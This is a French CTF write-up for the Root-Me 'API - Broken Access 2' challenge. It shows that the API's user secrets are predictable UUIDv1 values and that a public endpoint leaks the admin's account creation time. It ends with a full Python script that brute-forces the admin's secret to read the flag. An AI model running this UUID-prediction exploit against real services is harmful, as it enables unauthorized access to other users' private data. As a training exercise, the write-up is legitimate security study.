---
title: Web-Serveur - API - Broken Access 2
meta_title: ""
description: Web-Serveur - API - Broken Access 2
date: 2024-07-18T11:00:00Z
image: /images/rootme_logo.png
categories:
  - Rootme
  - Web-Serveur
  - Moyen
author: Demat
tags:
  - web-server
  - api
  - uuid
draft: false
isSecret: true
---

## Description

### Énoncé

**Lien du challenge : [Web-Serveur - API - Broken Access 2](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Broken-Access-2)**

> #### First is not always the best
>
> Après le cuisant échec de sa précédente plateforme, votre ami est revenu vers vous. Cette fois-ci, une sécurité a été mise en place afin de vous empêcher de lire les notes d’autrui, à moins que quelqu’un vous ait partagé son secret vous permettant de le faire avec son accord. Fini les vulnérabilités de contrôle d’accès (ou pas). Montrez-lui que son enthousiasme va être de courte durée et que le diable se cache dans les détails.
>
> #### Ressources associées
>
> - [🇬🇧 watch?v=RiKikKIibpk](https://www.youtube.com/watch?v=RiKikKIibpk) (www.youtube.com)

## Exploitation

### Contexte

Ce challenge fait suite à [Web-Serveur - API - Broken Access](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Broken-Access), l'API REST a été mise à jour pour ajouter une sécurité supplémentaire.

### Endpoints de l'API

Le [site web](http://challenge01.root-me.org/web-serveur/ch91/) est une simple page Swagger UI pour une API REST. On peut y voir les différents endpoints disponibles :

- `[POST]` `/api/signup` : Create a new user
- `[POST]` `/api/login` : Login to the application
- `[GET]` `/api/profile` : Retrieve user's profile information
- `[GET]` `/api/user/{user_id}` : Retrieve limited user information
- `[PUT]` `/api/note` : Update user note

Les modèles de données sont également explicités.

### Analyse de la sécurité

En lisant la liste des endpoints dans le Swagger, par rapport à la première partie du challenge, on se rend compte qu’un nouveau champ `secret` a été ajouté à la réponse pour l’endpoint `/api/login`, et qu’il peut être utilisé pour récupérer les informations privées de n’importe quel utilisateur tant qu’on connaît son secret (*via* `/api/profile`).
On remarque également la présence un autre champ, `creation_date`, qui n’était pas là auparavant (dans `/api/user` et `/api/profile`).

Après avoir créé un utilisateur, on a la réponse suivante quand on se login :

```json
{
    "message": "Logged in successfully, don't forget your session cookie to access logged-in only endpoints :-)",
    "secret": "393b07c7-44fa-11ef-8423-0242ac110019"
}
```

On remarque que le secret est un [UUIDv1](https://fr.wikipedia.org/wiki/Universally_unique_identifier#Version_1), qui se base sur le timestamp du moment où il a été généré. Cela expliquerait la présence du champ `creation_date`.

Pour confirmer, on peut créer un second compte peu de temps après :

```json
{
    "message": "Logged in successfully, don't forget your session cookie to access logged-in only endpoints :-)",
    "secret": "41da6e43-44fa-11ef-8423-0242ac110019"
}
```

On constate que les deux timestamps, `393b07c7-44fa-11ef-8423-0242ac110019` et `41da6e43-44fa-11ef-8423-0242ac110019`, ont des valeurs extrêmement similaires, dont juste le premier champ diffère.

Dans l’UUIDv1, les trois premiers champs correspondent au timestamp avec une résolution de 0.1µs, le quatrième est une "clock sequence" qui permet de différencier deux UUIDs qui auraient été générés à moins de 0.1µs d’intervalle, et le dernier champ est le "node", un identifiant unique de la machine.

Ici, on voit que les UUIDs ont les mêmes champs "node" et "clock sequence", ce qui nous permet de déduire n’importe quel UUID dont on connaît la date de génération.

Or, grâce à l’endpoint `/api/user/1`, on peut récupérer la date de création du compte admin :

```json
{
    "creation_date": "2024-07-18 02:11:52.083035",
    "userid": 1,
    "username": "admin"
}
```

### Principe d'exploitation de la faille de l'UUID

On peut donc générer un UUIDv1 pour l’admin avec la date de création de son compte, et ainsi récupérer son secret.
La seule difficulté réside dans le fait que le timestamp est donné avec une précision à la microseconde près, alors qu’un UUIDv1 a une précision au dixième de microseconde.

Il va donc falloir essayer toutes les valeurs possibles pour le chiffre de poids faible, ce qui ne fait pas beaucoup de requêtes au final.
Comme on ne sait pas si le timestamp est arrondi, tronqué ou autre, on va essayer des valeurs entre -9 et +9, histoire d’être certain de ne rien rater.

### Code Python pour l'exploitation

Dans le code Python suivant, on crée une classe API qui implémente les différents endpoints.
On crée également une fonction `uuid1_from_time()` qui génère un UUIDv1 à partir d’un objet `datetime` (le code est tiré du module `uuid` de la bibliothèque standard Python).

```python
#!/usr/bin/env python3

from __future__ import annotations

from datetime import datetime, timezone
from typing import NewType, TypedDict, cast
from uuid import UUID, uuid4

from requests import HTTPError, Session

URL = "http://challenge01.root-me.org:59091/api/"


class API:
    DateStr = NewType("DateStr", str)
    UuidStr = NewType("UuidStr", str)

    class SuccessRes(TypedDict):
        message: str

    class ErrorRes(TypedDict):
        error: str

    class LoginRes(TypedDict):
        message: str
        secret: API.UuidStr

    class ProfileRes(TypedDict):
        creation_date: API.DateStr
        note: str
        secret: API.UuidStr
        userid: int
        username: str

    class UserRes(TypedDict):
        creation_date: API.DateStr
        userid: int
        username: str

    def __init__(self) -> None:
        self._session = Session()
        self._session.headers.update({"Accept": "application/json"})

    @staticmethod
    def parse_date(date_str: DateStr) -> datetime:
        """Parse a date string into a datetime object in UTC timezone."""
        return datetime.strptime(date_str, r"%Y-%m-%d %H:%M:%S.%f").replace(tzinfo=timezone.utc)

    def api(
        self,
        path: str,
        method: str = "GET",
        params: dict[str, str] = {},
        data: dict[str, str] = {},
    ) -> dict[str, str]:
        url = URL + path
        res = self._session.request(method, url, params=params, json=data)
        res.raise_for_status()
        res_json = res.json()
        assert isinstance(res_json, dict), "Expected JSON dict"
        return res_json

    def signup(self, username: str, password: str) -> SuccessRes:
        data = {"username": username, "password": password}
        return cast(API.SuccessRes, self.api("signup", method="POST", data=data))

    def login(self, username: str, password: str) -> LoginRes:
        data = {"username": username, "password": password}
        return cast(API.LoginRes, self.api("login", method="POST", data=data))

    def profile(self, secret: str | UUID) -> ProfileRes:
        if isinstance(secret, UUID):
            secret = str(secret)
        params = {"secret": secret}
        return cast(API.ProfileRes, self.api("profile", params=params))

    def user(self, userid: int) -> UserRes:
        url = f"user/{userid}"
        return cast(API.UserRes, self.api(url))

    def note(self, value: str, secret: str | UUID) -> SuccessRes:
        if isinstance(secret, UUID):
            secret = str(secret)
        data = {"note": value, "secret": secret}
        return cast(API.SuccessRes, self.api("note", method="PUT", data=data))


def uuid1_from_time(time: datetime, node: int, clock_seq: int, delta: int = 0) -> UUID:
    """Create a UUIDv1 from a datetime object, with a custom node/clock_seq
    and optional time delta.
    Note: The code is adapted from `uuid1()` in the built-in `uuid` module."""
    timestamp = int(time.timestamp() * 10**7) + 0x01B21DD213814000
    timestamp += delta
    time_low = timestamp & 0xFFFFFFFF
    time_mid = (timestamp >> 32) & 0xFFFF
    time_hi_version = (timestamp >> 48) & 0x0FFF
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3F
    return UUID(
        fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node),
        version=1,
    )


def main() -> None:
    username = f"test_{uuid4()}"
    password = "test_password"

    api = API()

    try:
        print("Registering user", username, "with password", password)
        res_register: API.SuccessRes | API.ErrorRes = api.signup(username, password)
    except HTTPError as e:
        response = e.response
        # 400: "Username already exists", try to login anyway
        if response is None or response.status_code != 400:
            # Any other error is unexpected
            raise
        res_register = cast(API.ErrorRes, response.json())
    print("< Register:", res_register)

    # Login and the get the secret UUID to duplicate its node and clock_seq
    res_login = api.login(username, password)
    print("< Login:", res_login)
    my_uuid = UUID(res_login["secret"])
    assert my_uuid.version == 1, "Expected UUIDv1"

    # Get admin user creation date (admin is userid 1)
    admin = api.user(1)
    print("< Admin:", admin)
    date = API.parse_date(admin["creation_date"])

    # Try all possible values for the last digit of the UUID timestamp
    for delta in range(-9, 10):
        secret = uuid1_from_time(date, my_uuid.node, my_uuid.clock_seq, delta)
        print("Trying secret:", secret)
        try:
            res_profile = api.profile(secret)
        except HTTPError as e:
            response = e.response
            if response is None or response.status_code == 404:
                # 404: "Secret doesn't correspond to any user", try next secret
                continue
            # Any other error is unexpected
            raise
        # No error: we found the secret
        break
    else:
        print("Could not find secret :(")
        return

    print("Flag:", res_profile["note"])


if __name__ == "__main__":
    main()
```

### Résultat de l'exploitation

Le script Python s'exécute rapidement et trouve le secret de l'admin, qui est le flag du challenge :

![Résultat de l'exploitation](/images/broken-access-2/admin-secret-recovery.png)
